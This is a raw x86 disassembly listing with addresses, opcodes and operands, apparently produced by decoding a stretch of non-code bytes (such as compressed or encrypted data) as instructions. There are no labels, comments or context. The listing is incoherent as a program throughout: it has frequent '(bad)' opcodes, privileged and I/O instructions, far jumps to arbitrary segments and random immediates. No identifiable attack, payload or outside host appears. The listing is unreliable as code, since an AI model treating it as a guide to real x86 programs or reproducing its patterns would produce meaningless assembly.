  418f22:	add    al,0xec
  418f24:	add    BYTE PTR [eax],al
  418f26:	int3   
  418f27:	aas    
  418f28:	add    BYTE PTR [eax],al
  418f2a:	and    DWORD PTR [ebx-0x5dcdd918],edi
  418f30:	add    al,0x52
  418f32:	add    BYTE PTR [eax],al
  418f34:	loop   0x418ed8
  418f36:	neg    BYTE PTR [eax]
  418f38:	std    
  418f39:	loope  0x418ec1
  418f3b:	push   ss
  418f3c:	stos   BYTE PTR es:[edi],al
  418f3d:	push   esp
  418f3e:	sbb    dh,BYTE PTR [eax+edi*2-0x4d]
  418f42:	(bad)  
  418f43:	ficom  DWORD PTR [ebp+0x62f1b4c9]
  418f49:	shl    BYTE PTR [esi-0x443c0000],0x0
  418f50:	add    BYTE PTR [ebp+0x23f97889],dl
  418f56:	sbb    eax,0xbbc14d51
  418f5b:	add    DWORD PTR [edi+0x24],edx
  418f5e:	stc    
  418f5f:	xchg   edi,eax
  418f60:	pop    ecx
  418f61:	xchg   ecx,eax
  418f62:	les    eax,FWORD PTR [edi+0x0]
  418f65:	add    BYTE PTR [esi-0x21],al
  418f68:	repz fidivr DWORD PTR [ebp*8+0x7ab620d7]
  418f70:	in     eax,dx
  418f71:	mov    bl,0x21
  418f73:	cmp    eax,0xd43d37ba
  418f78:	mov    BYTE PTR [ebx-0x503a0000],dl
  418f7e:	and    al,BYTE PTR [edi+0x75]
  418f81:	js     0x418f40
  418f83:	inc    edx
  418f84:	test   eax,0x24c11cd7
  418f89:	stc    
  418f8a:	(bad)  
  418f8b:	pushf  
  418f8c:	out    0x86,al
  418f8e:	test   al,0x68
  418f90:	arpl   dx,ax
  418f92:	sti    
  418f93:	dec    edi
  418f94:	retf   0x98b6
  418f97:	or     edx,DWORD PTR ds:0xd746d6c5
  418f9d:	mov    BYTE PTR [esi],bl
  418f9f:	add    BYTE PTR [eax],al
  418fa1:	sahf   
  418fa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fa3:	shl    BYTE PTR cs:[ecx+0x1e],1
  418fa7:	das    
  418fa8:	jmp    0x418f49
  418faa:	xchg   ebp,eax
  418fab:	outs   dx,DWORD PTR ds:[esi]
  418fac:	xchg   ebp,eax
  418fad:	loope  0x418f93
  418faf:	sub    bh,BYTE PTR [ebp+ebx*8+0x6f]
  418fb3:	and    ecx,ebp
  418fb5:	js     0x418f37
  418fb7:	pop    ds
  418fb8:	add    BYTE PTR [eax],al
  418fba:	add    eax,0x9411f4fe
  418fbf:	or     DWORD PTR [ecx+0x7],edx
  418fc2:	jbe    0x419006
  418fc4:	or     ebp,DWORD PTR [esi+0x2c89ca9f]
  418fca:	dec    edx
  418fcb:	push   ebx
  418fcc:	and    DWORD PTR [ebp+0x5c25d620],0x59689205
  418fd6:	mov    dl,0xf6
  418fd8:	mov    dh,0x3a
  418fda:	inc    eax
  418fdb:	jecxz  0x418fdd
  418fdd:	add    BYTE PTR [eax],dh
  418fdf:	add    al,0x98
  418fe1:	add    BYTE PTR [eax],al
  418fe3:	shr    DWORD PTR [ebp+0x32c4c2],cl
  418fe9:	add    dl,ch
  418feb:	ins    DWORD PTR es:[edi],dx
  418fec:	gs ds mov bh,0x76
  418ff0:	(bad)  
  418ff1:	push   ds
  418ff2:	test   esi,edx
  418ff4:	imul   esi,DWORD PTR [ebp+0x6856b6c1],0xdaa32071
  418ffe:	in     al,0xfb
  419000:	xor    eax,ebx
  419002:	sar    BYTE PTR [edx],cl
  419004:	cmc    
  419005:	dec    eax
  419006:	imul   eax,DWORD PTR [eax],0x59136200
  41900c:	sbb    eax,0x71d7622
  419011:	mov    eax,0xb21b1fa8
  419016:	push   esp
  419017:	lods   al,BYTE PTR ds:[esi]
  419018:	pop    ds
  419019:	lahf   
  41901a:	adc    BYTE PTR [esi+0x7a],cl
  41901d:	pop    es
  41901e:	cmp    al,0xbe
  419020:	mov    edi,0xedb6a1d8
  419025:	mov    dh,0xc1
  419027:	jo     0x419014
  419029:	int3   
  41902a:	cli    
  41902b:	add    BYTE PTR [eax],al
  41902d:	aad    0xb5
  41902f:	cld    
  419030:	or     al,0xfe
  419032:	add    BYTE PTR [eax],al
  419034:	xlat   BYTE PTR ds:[ebx]
  419035:	je     0x4190a3
  419037:	in     eax,0x58
  419039:	loope  0x418fda
  41903b:	push   esi
  41903c:	shl    DWORD PTR [esi],1
  41903e:	inc    edx
  41903f:	and    dh,BYTE PTR [ebx+0x47d20f9d]
  419045:	fsubr  DWORD PTR [eax]
  419047:	test   BYTE PTR ds:0xda440000,dh
  41904d:	add    BYTE PTR [eax],al
  41904f:	fild   WORD PTR [edi-0x430dd69e]
  419055:	xchg   esp,eax
  419056:	sbb    DWORD PTR [edx-0x6a2d817],eax
  41905c:	add    esp,DWORD PTR [edx]
  41905e:	push   0xdbd4169
  419063:	aas    
  419064:	call   0x4ec7:0x1add70e2
  41906b:	fbstp  TBYTE PTR [esi+0x33]
  41906e:	imul   esi,DWORD PTR [eax+0x6c04868a],0x581f0000
  419078:	mov    cl,BYTE PTR [eax+eax*1+0x2f10000]
  41907f:	xchg   esi,eax
  419080:	sub    eax,DWORD PTR [ecx]
  419082:	lods   eax,DWORD PTR ds:[esi]
  419083:	mov    edi,DWORD PTR [eax+0xd]
  419086:	and    edx,ebp
  419088:	jo     0x41907e
  41908a:	call   FWORD PTR ds:0x78c9fe45
  419090:	sti    
  419091:	cdq    
  419092:	fcom   DWORD PTR [ebx-0x6a557e6f]
  419098:	jecxz  0x41905c
  41909a:	mov    edi,0xa84d1
  41909f:	add    BYTE PTR [edi*4+0xca40ae],dl
  4190a6:	add    dh,ah
  4190a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190a9:	clc    
  4190aa:	and    DWORD PTR [esi-0x79],ebp
  4190ad:	gs push edx
  4190af:	inc    ebx
  4190b0:	push   ebx
  4190b1:	daa    
  4190b2:	xchg   DWORD PTR [edi+0x6b],edx
  4190b5:	pop    ebp
  4190b6:	xchg   esi,eax
  4190b7:	ins    DWORD PTR es:[edi],dx
  4190b8:	inc    ecx
  4190b9:	iret   
  4190ba:	(bad)  
  4190bb:	mov    ah,BYTE PTR [edi-0x57]
  4190be:	jmp    0x172396ec
  4190c3:	adc    DWORD PTR [ebx+ebp*1],0xffffffd6
  4190c7:	mov    dh,0x90
  4190c9:	sub    al,0x4b
  4190cb:	mov    ecx,0x84afb4f0
  4190d0:	outs   dx,BYTE PTR ds:[esi]
  4190d1:	add    BYTE PTR [eax],al
  4190d3:	sbb    BYTE PTR [ebx],bl
  4190d5:	dec    ecx
  4190d6:	(bad)  
  4190d8:	scas   eax,DWORD PTR es:[edi]
  4190d9:	out    dx,eax
  4190da:	inc    esp
  4190db:	rol    DWORD PTR [eax],0x0
  4190de:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190e0:	inc    esi
  4190e1:	adc    DWORD PTR [ebx-0x4d9f57b6],0x53
  4190e8:	mov    cl,0xfe
  4190ea:	inc    esi
  4190eb:	xchg   ecx,eax
  4190ec:	and    cl,dh
  4190ee:	sub    DWORD PTR [ebp*2+0x31c4],edx
  4190f5:	jle    0x419176
  4190f7:	out    dx,al
  4190f8:	and    DWORD PTR [edi+edx*1-0x74420000],eax
  4190ff:	inc    edx
  419100:	fs or  eax,0x716445a1
  419106:	mov    edi,0x934163fc
  41910b:	cmp    BYTE PTR [ecx],cl
  41910d:	xchg   BYTE PTR [ebp+0x7d3416b7],ch
  419113:	repz xchg dl,ch
  419116:	mov    eax,0xdacb360d
  41911b:	fisub  WORD PTR [ebp+0x490e028e]
  419121:	addr16 or al,0x28
  419124:	add    BYTE PTR [eax],al
  419126:	cli    
  419127:	mov    cl,0x39
  419129:	and    al,0x6a
  41912b:	cwde   
  41912c:	or     eax,eax
  41912e:	aam    0x0
  419130:	add    BYTE PTR [esi],ah
  419132:	push   edi
  419133:	imul   eax,DWORD PTR [edi],0x365f2c26
  419139:	xor    al,0x2b
  41913b:	dec    esi
  41913c:	outs   dx,DWORD PTR ds:[esi]
  41913d:	jp     0x41911d
  41913f:	mov    BYTE PTR [ecx],al
  419141:	add    BYTE PTR [eax],al
  419143:	ss (bad) 
  419145:	cmp    DWORD PTR [esi+0xd180f7],esi
  41914b:	add    ch,bh
  41914d:	xchg   esp,eax
  41914e:	retf   
  41914f:	add    DWORD PTR [ebp+0x2f],esi
  419152:	push   esp
  419153:	pop    es
  419154:	jne    0x419131
  419156:	nop
  419157:	mov    edx,0x85269c6c
  41915c:	mov    al,BYTE PTR [edi-0x71]
  41915f:	cdq    
  419160:	sub    DWORD PTR [eax],ebx
  419162:	mov    eax,ds:0x9fdb4b54
  419167:	xchg   edi,eax
  419168:	addr16 mov bh,0xed
  41916b:	and    ebx,ecx
  41916d:	mov    dh,BYTE PTR [esi-0x1f542369]
  419173:	pushf  
  419174:	and    DWORD PTR [ebx-0x6e7bfd94],esi
  41917a:	add    BYTE PTR [eax],al
  41917c:	mov    WORD PTR [eax],ss
  41917e:	add    BYTE PTR [eax],al
  419180:	adc    eax,0x7f9eb4aa
  419185:	int    0x65
  419187:	mov    ecx,0x4edacefb
  41918c:	xchg   esp,eax
  41918d:	fbstp  TBYTE PTR [ebx]
  41918f:	mov    DWORD PTR [eax],edx
  419191:	fisub  DWORD PTR [esi]
  419194:	push   0x1a
  419196:	(bad)  
  419198:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419199:	bound  esp,QWORD PTR [ebx+0x17]
  41919c:	loop   0x41919e
  41919e:	daa    
  41919f:	add    BYTE PTR [eax],al
  4191a1:	das    
  4191a2:	add    DWORD PTR [edx+eiz*1-0x6d0b0000],0x9e586437
  4191ad:	cld    
  4191ae:	stos   DWORD PTR es:[edi],eax
  4191af:	dec    esp
  4191b0:	mov    BYTE PTR [eax],al
  4191b2:	add    BYTE PTR [eax],bh
  4191b4:	or     al,BYTE PTR [ebx+0x72]
  4191b7:	sti    
  4191b8:	xor    bh,BYTE PTR [ecx]
  4191ba:	es push cs
  4191bc:	and    al,0x2f
  4191be:	out    0x8d,al
  4191c0:	adc    eax,0x5874fd47
  4191c5:	or     DWORD PTR [ebp+0x2b917092],eax
  4191cb:	sub    ch,cl
  4191cd:	cmp    DWORD PTR [edi-0x3c],esi
  4191d0:	xchg   edx,eax
  4191d1:	add    BYTE PTR [eax],al
  4191d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191d4:	mov    ecx,0xe07e2918
  4191d9:	mov    ebp,DWORD PTR cs:[ecx+0x3817154f]
  4191e0:	adc    eax,0x3c49609c
  4191e5:	aam    0x33
  4191e7:	in     al,dx
  4191e8:	add    BYTE PTR [esi+0x0],bl
  4191eb:	add    BYTE PTR [ebx-0x7df729ac],ah
  4191f1:	add    BYTE PTR [eax],al
  4191f3:	std    
  4191f4:	call   0x6565:0x2078623a
  4191fb:	imul   edi,ecx,0xffffffe9
  4191fe:	mov    ds:0x714f2cec,eax
  419203:	push   es
  419204:	les    esi,FWORD PTR [edi]
  419206:	add    BYTE PTR [eax],al
  419208:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419209:	add    ebp,ebp
  41920b:	retf   0x7f76
  41920e:	dec    ecx
  41920f:	ja     0x419246
  419211:	iret   
  419212:	inc    ebp
  419213:	sub    DWORD PTR [edi+0x69686a4b],ecx
  419219:	test   eax,0x1284f9
  41921e:	add    BYTE PTR [ebx+0x70c0],ch
  419224:	jno    0x419280
  419226:	imul   ebp,DWORD PTR [ebx+0x16],0x6f
  41922a:	xchg   DWORD PTR [ebx+edx*4-0x2fae058c],edi
  419231:	cmp    ah,BYTE PTR [bx+si+0x7b49]
  419236:	sti    
  419237:	mov    dl,0x4
  419239:	sbb    al,0x0
  41923b:	add    dl,ah
  41923d:	or     esp,DWORD PTR [eax]
  41923f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419240:	push   edi
  419241:	scas   eax,DWORD PTR es:[edi]
  419242:	add    BYTE PTR [eax+eax*1-0x6792bd00],ah
  419249:	neg    BYTE PTR [ecx+edx*4-0x36253844]
  419250:	popf   
  419251:	(bad)  
  419252:	jge    0x41922a
  419254:	popa   
  419255:	into   
  419256:	(bad)  
  419257:	lds    ebx,FWORD PTR [ebp+ebx*4-0x62784176]
  41925e:	adc    BYTE PTR [edi-0x2936c8d6],dh
  419264:	loop   0x419279
  419266:	sub    bh,BYTE PTR [edi+0x4a927fcf]
  41926c:	arpl   WORD PTR [ecx-0x42],sp
  41926f:	popa   
  419270:	je     0x419209
  419272:	pop    edx
  419273:	xchg   DWORD PTR [ecx-0x32],esp
  419276:	jae    0x4192b4
  419278:	(bad)  
  419279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41927a:	jp     0x41928c
  41927c:	jbe    0x4192ef
  41927e:	js     0x4192bc
  419280:	push   0x7af457d1
  419285:	ret    
  419286:	mov    eax,0xc71618fd
  41928b:	std    
  41928c:	ror    DWORD PTR [edx-0x1f],1
  41928f:	pop    es
  419290:	xor    BYTE PTR [ecx-0x30],al
  419293:	mov    al,0x99
  419295:	iret   
  419296:	jmp    0x419253
  419298:	fist   WORD PTR [ebx]
  41929a:	jne    0x419288
  41929c:	jmp    0x8dd8:0x174815e
  4192a3:	shl    BYTE PTR [eax],cl
  4192a5:	call   0x14c39de2
  4192aa:	fs dec edx
  4192ac:	push   0x4b0ab87
  4192b1:	push   0x0
  4192b3:	add    BYTE PTR [eax+edi*8],ah
  4192b6:	fmul   DWORD PTR [eax+0x6c]
  4192b9:	add    BYTE PTR [eax],al
  4192bb:	je     0x4192c4
  4192bd:	pop    esi
  4192be:	xlat   BYTE PTR ds:[ebx]
  4192bf:	loopne 0x4192f4
  4192c1:	clc    
  4192c2:	mov    ebp,0x84dc2df2
  4192c7:	jp     0x4192c9
  4192c9:	add    BYTE PTR [edx-0x3c78c7e2],dl
  4192cf:	idiv   BYTE PTR [eax]
  4192d1:	cmc    
  4192d2:	add    eax,0xc3852b18
  4192d7:	push   ebx
  4192d8:	jmp    0x405b:0xc16b7066
  4192df:	cwde   
  4192e0:	add    BYTE PTR [eax],al
  4192e2:	scas   al,BYTE PTR es:[edi]
  4192e3:	push   ebx
  4192e4:	bound  edx,QWORD PTR [edx+0x36]
  4192e7:	scas   eax,DWORD PTR es:[edi]
  4192e8:	sbb    ebp,esp
  4192ea:	add    al,0x63
  4192ec:	add    BYTE PTR [eax],al
  4192ee:	xchg   esi,eax
  4192ef:	cs ss jae 0x4192f4
  4192f3:	push   ecx
  4192f4:	sub    al,0x96
  4192f6:	sub    eax,0x90f8fa8e
  4192fb:	and    eax,0xd02cb4f3
  419300:	ss add esp,eax
  419303:	sub    DWORD PTR [eax],eax
  419305:	add    BYTE PTR [ebp+0x4fa3fde0],cl
  41930b:	test   al,0x45
  41930d:	adc    eax,0x6a21a349
  419312:	(bad)  
  419313:	test   eax,0x7880
  419318:	add    eax,0xa2c7ac90
  41931d:	call   0x4a9f:0x986cdb71
  419324:	stos   DWORD PTR es:[edi],eax
  419325:	xlat   BYTE PTR ds:[ebx]
  419326:	cld    
  419327:	pop    esi
  419328:	push   0x23d075c6
  41932d:	push   ecx
  41932e:	sub    DWORD PTR [edi-0x19a2d58d],eax
  419334:	add    ch,BYTE PTR [esi-0x30]
  419337:	jnp    0x4192f3
  419339:	mov    BYTE PTR [eax+eax*1-0x41ce3700],dh
  419340:	sub    dl,BYTE PTR [ecx]
  419342:	in     al,dx
  419343:	fadd   QWORD PTR [eax+0x730000c1]
  419349:	fnstsw WORD PTR gs:[esi+0x43a7da1]
  419350:	cli    
  419351:	add    BYTE PTR [eax],al
  419353:	push   ebp
  419354:	mov    WORD PTR [esi+0x0],fs
  419357:	add    dl,dh
  419359:	aam    0x1d
  41935b:	ins    BYTE PTR es:[edi],dx
  41935c:	jecxz  0x41934c
  41935e:	mov    ah,0x57
  419360:	sbb    BYTE PTR [esi],ch
  419362:	ds fadd DWORD PTR ss:[ecx-0x491da89b]
  41936a:	mov    al,ds:0xac3d3df0
  41936f:	ja     0x4193c6
  419371:	push   es
  419372:	call   0xb20b:0x41282eaf
  419379:	adc    DWORD PTR [ecx-0x5c],0x76e0cab4
  419380:	shl    ebx,0xe3
  419383:	mov    eax,ds:0x1dc5725d
  419388:	mov    ds:0xd048,eax
  41938d:	mov    eax,0xa70fe054
  419392:	(bad)  
  419393:	ror    BYTE PTR [ecx+0x2bd9c2a3],1
  419399:	and    eax,0xf0e358fd
  41939e:	into   
  41939f:	pop    ebp
  4193a0:	push   edi
  4193a1:	cld    
  4193a2:	rcl    BYTE PTR [ecx+0x219c0000],0xd5
  4193a9:	jae    0x419385
  4193ab:	enter  0xb2,0x0
  4193af:	mov    eax,0xdd61244a
  4193b4:	sbb    al,0xf6
  4193b6:	or     dl,BYTE PTR [ebx+0x33d1769f]
  4193bc:	sbb    al,0x9b
  4193be:	mov    cr4,esi
  4193c1:	xchg   esp,eax
  4193c2:	mov    dl,0x3a
  4193c4:	(bad)  
  4193c5:	fwait
  4193c6:	sub    ebx,ebp
  4193c8:	xchg   DWORD PTR [ecx-0x4a947208],esp
  4193ce:	(bad)  
  4193cf:	aaa    
  4193d0:	push   ebp
  4193d1:	jns    0x4193cc
  4193d3:	and    eax,0x7f04
  4193d8:	sbb    BYTE PTR [esi-0x45e9f99e],bh
  4193de:	mov    ah,0xd3
  4193e0:	xchg   edx,eax
  4193e1:	jb     0x4193f8
  4193e3:	popa   
  4193e4:	push   esp
  4193e5:	pop    ebp
  4193e6:	imul   esp,DWORD PTR [edi],0x47
  4193e9:	jp     0x419370
  4193eb:	(bad)  
  4193ec:	push   esp
  4193ed:	dec    eax
  4193ee:	xchg   esi,eax
  4193ef:	add    BYTE PTR [eax],al
  4193f1:	(bad)  
  4193f2:	jge    0x41943e
  4193f4:	retf   
  4193f5:	aaa    
  4193f6:	add    BYTE PTR [edx-0x54290000],dh
  4193fc:	sbb    dl,0x0
  4193ff:	add    ch,ch
  419401:	jg     0x419406
  419403:	push   eax
  419404:	jmp    0xba7a1f7f
  419409:	cmc    
  41940a:	ror    ebx,0x6b
  41940d:	rsm    
  41940f:	xchg   esp,eax
  419410:	pop    edi
  419411:	das    
  419412:	push   esp
  419413:	cs pushf 
  419415:	daa    
  419416:	mov    al,ds:0x898c
  41941b:	btr    DWORD PTR [edi+0x29],ecx
  41941f:	scas   al,BYTE PTR es:[edi]
  419420:	push   cs
  419421:	jge    0x4193e6
  419423:	das    
  419424:	xor    al,0x23
  419426:	jbe    0x419471
  419428:	push   ss
  419429:	xor    ebp,ebp
  41942b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41942c:	(bad)  
  41942d:	std    
  41942e:	pop    ebx
  41942f:	adc    al,0x99
  419431:	call   0xc7d1767f
  419436:	and    DWORD PTR [ecx+ebx*1],edx
  419439:	and    eax,0x5f088bd0
  41943e:	add    BYTE PTR [eax],al
  419440:	cmp    esi,DWORD PTR [eax-0x1a]
  419443:	mov    DWORD PTR [edx+eiz*4+0x2fca0000],eax
  41944a:	mov    eax,0xdf59bbde
  41944f:	add    esp,ebp
  419451:	xchg   esi,eax
  419452:	push   esi
  419453:	frstor [esi-0x67]
  419456:	adc    al,BYTE PTR [ebx]
  419458:	inc    ebx
  419459:	xor    al,0x70
  41945b:	ss stc 
  41945d:	scas   al,BYTE PTR es:[edi]
  41945e:	shl    BYTE PTR [ecx],0x0
  419461:	add    BYTE PTR [ecx-0xc93b907],al
  419467:	scas   al,BYTE PTR es:[edi]
  419468:	ins    DWORD PTR es:[edi],dx
  419469:	push   esp
  41946a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41946b:	bound  ebx,QWORD PTR [ebx+0x79]
  41946e:	sbb    DWORD PTR [edi-0x3b],0xffffffb8
  419472:	mov    ch,0xbc
  419474:	lea    ebx,[edi+0x5b]
  419477:	fstp   TBYTE PTR [esi+0x6b]
  41947a:	cmp    eax,0xcd08
  41947f:	nop
  419480:	dec    edx
  419481:	jns    0x41943e
  419483:	cli    
  419484:	xor    DWORD PTR [eax+edi*2+0x4d809a],0x0
  41948c:	mov    bl,0x86
  41948e:	dec    eax
  41948f:	mov    al,BYTE PTR [eax]
  419491:	add    ah,ch
  419493:	sub    BYTE PTR [ecx],dl
  419495:	pop    edi
  419496:	xchg   esi,eax
  419497:	hlt    
  419498:	pop    ss
  419499:	icebp  
  41949a:	and    bl,BYTE PTR [edx-0x20b8415a]
  4194a0:	xchg   ecx,eax
  4194a1:	push   es
  4194a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194a3:	cs retf 
  4194a5:	push   edx
  4194a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194a7:	jl     0x419501
  4194a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194aa:	push   ebx
  4194ab:	sbb    DWORD PTR [ecx+0x648c],edi
  4194b1:	fwait
  4194b2:	push   edx
  4194b3:	mov    WORD PTR [ecx],?
  4194b5:	add    BYTE PTR [eax],al
  4194b7:	into   
  4194b8:	das    
  4194b9:	adc    BYTE PTR ds:[esp+edi*4-0xf],bl
  4194be:	sahf   
  4194bf:	imul   esi,DWORD PTR [esi+0x532128e1],0x7e18b92d
  4194c9:	fisubr DWORD PTR [ecx-0x42]
  4194cc:	xchg   esp,eax
  4194cd:	fist   WORD PTR [edx]
  4194cf:	jbe    0x4194b6
  4194d1:	ins    DWORD PTR es:[edi],dx
  4194d2:	cmp    al,0x31
  4194d4:	aam    0xbe
  4194d6:	and    DWORD PTR [eax-0x57],ecx
  4194d9:	add    BYTE PTR [eax],al
  4194db:	mov    dl,0x75
  4194dd:	mov    eax,ds:0x8ae5a6b
  4194e2:	mov    eax,DWORD PTR [eax]
  4194e4:	add    BYTE PTR [ecx],cl
  4194e6:	inc    ebp
  4194e7:	inc    edi
  4194e8:	(bad)  
  4194e9:	test   eax,0x95bc07ea
  4194ee:	je     0x4194fc
  4194f0:	push   cs
  4194f1:	add    BYTE PTR [eax],al
  4194f3:	repnz xchg ebx,eax
  4194f5:	add    al,0xd3
  4194f7:	add    BYTE PTR [eax],al
  4194f9:	test   DWORD PTR [ebp-0x718a2f92],esi
  4194ff:	popa   
  419500:	cli    
  419501:	(bad)  
  419502:	aas    
  419503:	jnp    0x419498
  419505:	loopne 0x41955f
  419507:	fcomip st,st(6)
  419509:	push   ebp
  41950a:	or     DWORD PTR [eax+0x4b54c791],esp
  419510:	xchg   DWORD PTR [ebx+0xa962566],esp
  419516:	mov    ch,BYTE PTR [ecx-0x335d39ca]
  41951c:	jle    0x41951e
  41951e:	add    BYTE PTR [ecx+0x2f7b0370],dl
  419524:	mov    edx,0xbbfe8db0
  419529:	bound  eax,QWORD PTR [ebp+0x17]
  41952c:	inc    edi
  41952d:	mov    esi,0x49c45ca9
  419532:	add    BYTE PTR [eax],al
  419534:	push   edx
  419535:	sahf   
  419536:	xor    DWORD PTR [edx],eax
  419538:	inc    ebp
  419539:	jne    0x4194dd
  41953b:	fidiv  DWORD PTR [eax+0x3cedf4ea]
  419541:	sahf   
  419542:	rcr    BYTE PTR [edx],cl
  419544:	clc    
  419545:	cmc    
  419546:	stos   BYTE PTR es:[edi],al
  419547:	lds    eax,FWORD PTR [edx+esi*8+0x0]
  41954b:	add    BYTE PTR [ecx],cl
  41954d:	jae    0x41958f
  41954f:	popa   
  419550:	add    BYTE PTR [eax],al
  419552:	pushf  
  419553:	nop
  419554:	pop    esi
  419555:	push   DWORD PTR [edi+0x25]
  419558:	ins    BYTE PTR es:[edi],dx
  419559:	add    cl,BYTE PTR [esi]
  41955b:	mov    esp,0xd6862e3a
  419560:	lods   eax,DWORD PTR ds:[esi]
  419561:	mov    ecx,0x48f7b281
  419566:	jbe    0x419568
  419568:	add    BYTE PTR [ebx+0xb8c494],dh
  41956e:	add    BYTE PTR [edx+0x3d],ch
  419571:	ret    
  419572:	gs push ebx
  419574:	mov    eax,esi
  419576:	sub    ch,bl
  419578:	cwde   
  419579:	push   0x54f63a3b
  41957e:	cdq    
  41957f:	retf   
  419580:	and    BYTE PTR ds:0x5aa982d4,dh
  419586:	pop    edi
  419587:	fld    TBYTE PTR [esi+0x76c8]
  41958d:	sti    
  41958e:	xchg   DWORD PTR [ecx+0x55c0],ebp
  419594:	aaa    
  419595:	push   ds
  419596:	in     eax,dx
  419597:	cwde   
  419598:	jmp    0x33838cdc
  41959d:	cmp    DWORD PTR [esi+0xb],0xffffff80
  4195a1:	repz add BYTE PTR [eax],al
  4195a4:	pop    esi
  4195a5:	inc    eax
  4195a6:	add    BYTE PTR es:[eax],al
  4195a9:	mov    bh,0xa
  4195ab:	bnd jne 0x419574
  4195ae:	sbb    DWORD PTR [edi-0x6b],ecx
  4195b1:	aam    0xae
  4195b3:	out    0x7,al
  4195b5:	das    
  4195b6:	push   ds
  4195b7:	push   ss
  4195b8:	add    ah,cl
  4195ba:	dec    edx
  4195bb:	adc    DWORD PTR [ebx+0x16dce26f],edx
  4195c1:	dec    eax
  4195c2:	arpl   WORD PTR [eax],ax
  4195c4:	add    BYTE PTR [ecx-0x28df3dc8],dh
  4195ca:	sub    al,0x19
  4195cc:	shr    BYTE PTR [esi+ecx*8],1
  4195cf:	lods   eax,DWORD PTR ds:[esi]
  4195d0:	mov    al,ds:0x115c8b05
  4195d5:	call   0xc700:0xfeccaa
  4195dc:	add    BYTE PTR [ecx+0x0],dh
  4195df:	add    BYTE PTR [ecx-0x53],bh
  4195e2:	ror    BYTE PTR [ecx-0x6aa40000],0x1c
  4195e9:	jbe    0x419609
  4195eb:	ficom  WORD PTR [ecx+0x15]
  4195ee:	lods   al,BYTE PTR ds:[esi]
  4195ef:	test   al,0x99
  4195f1:	lock cli 
  4195f3:	or     al,dl
  4195f5:	inc    edx
  4195f6:	mov    fs,WORD PTR [ecx-0x2c30ee39]
  4195fc:	mov    eax,ds:0xdb80
  419601:	sahf   
  419602:	inc    ebx
  419603:	adc    ah,BYTE PTR [ecx]
  419605:	jo     0x4195d9
  419607:	jb     0x41962e
  419609:	xlat   BYTE PTR ds:[ebx]
  41960a:	mov    cl,0x70
  41960c:	jae    0x4195fe
  41960e:	(bad)  
  41960f:	adc    BYTE PTR [eax-0x24f9d501],ch
  419615:	aas    
  419616:	pop    esi
  419617:	(bad)  
  419618:	fidiv  DWORD PTR [esi+ecx*8]
  41961b:	mov    ecx,0x872ea4d0
  419620:	(bad)  
  419621:	jo     0x4195a7
  419623:	in     al,dx
  419624:	add    BYTE PTR [eax],al
  419626:	call   0xa900:0x1a4403
  41962d:	mov    eax,0x7c92a343
  419632:	sahf   
  419633:	xor    DWORD PTR [edx-0x8],eax
  419636:	or     BYTE PTR [edx],0x0
  419639:	add    BYTE PTR [eax-0x6fc53dc1],bh
  41963f:	jo     0x41961b
  419641:	outs   dx,BYTE PTR ds:[esi]
  419642:	pop    edi
  419643:	icebp  
  419644:	add    edx,DWORD PTR [edx-0x635bea81]
  41964a:	xor    edi,ecx
  41964c:	mov    eax,ds:0x8201f0ba
  419651:	scas   al,BYTE PTR es:[edi]
  419652:	dec    ecx
  419653:	ja     0x41962a
  419655:	pause  
  419657:	pop    es
  419658:	test   DWORD PTR [eax+0x7a],edx
  41965b:	retf   
  41965c:	popa   
  41965d:	icebp  
  41965e:	mov    bh,0x87
  419660:	rol    DWORD PTR [eax+0x6300009a],1
  419666:	in     al,dx
  419667:	push   esp
  419668:	xor    al,bl
  41966a:	ds jno 0x419693
  41966d:	cmp    al,0x27
  41966f:	sub    BYTE PTR [esp+ebp*1+0xa34c16],0x0
  419677:	sti    
  419678:	pop    edx
  419679:	xchg   esp,eax
  41967a:	in     eax,0xdf
  41967c:	lds    eax,FWORD PTR [eax]
  41967e:	stos   BYTE PTR es:[edi],al
  41967f:	add    BYTE PTR [eax],al
  419681:	push   ebx
  419682:	not    BYTE PTR [edi-0x39]
  419685:	dec    ecx
  419686:	adc    esi,DWORD PTR [eax-0x4f43e369]
  41968c:	and    ch,BYTE PTR [ecx-0x3f616407]
  419692:	rol    DWORD PTR [eax],1
  419694:	add    BYTE PTR [ebp-0x7a3470],bl
  41969a:	push   ds
  41969b:	mov    WORD PTR [ecx+0x0],?
  41969e:	add    BYTE PTR [eax+ebp*1+0x8444],bl
  4196a5:	push   esi
  4196a6:	iret   
  4196a7:	mov    al,ds:0x8548c76e
  4196ac:	add    BYTE PTR [eax],al
  4196ae:	pop    edx
  4196af:	test   al,0x2b
  4196b1:	inc    esp
  4196b2:	adc    DWORD PTR [eax],eax
  4196b4:	add    al,dl
  4196b6:	jns    0x4196e9
  4196b8:	xchg   esp,eax
  4196b9:	inc    ebx
  4196ba:	(bad)  
  4196bb:	outs   dx,DWORD PTR ds:[esi]
  4196bc:	jecxz  0x41967b
  4196be:	pop    es
  4196bf:	dec    esp
  4196c0:	inc    DWORD PTR [eax]
  4196c2:	add    cl,bh
  4196c4:	inc    ebx
  4196c5:	mov    ah,0x2e
  4196c7:	sahf   
  4196c8:	add    DWORD PTR [edx],esi
  4196ca:	pusha  
  4196cb:	sbb    BYTE PTR [ebx+eax*4],dl
  4196ce:	mov    bl,0x35
  4196d0:	xchg   edi,eax
  4196d1:	mov    eax,ds:0x44be0b27
  4196d6:	test   DWORD PTR [eax],0xd04e6100
  4196dc:	pop    edi
  4196dd:	mov    ah,0xac
  4196df:	jno    0x419701
  4196e1:	push   esp
  4196e2:	sbb    BYTE PTR [eax],cl
  4196e4:	push   ss
  4196e5:	add    BYTE PTR [eax],al
  4196e7:	pop    ds
  4196e8:	clc    
  4196e9:	push   ss
  4196ea:	in     eax,0x4b
  4196ec:	ret    
  4196ed:	pop    esp
  4196ee:	popa   
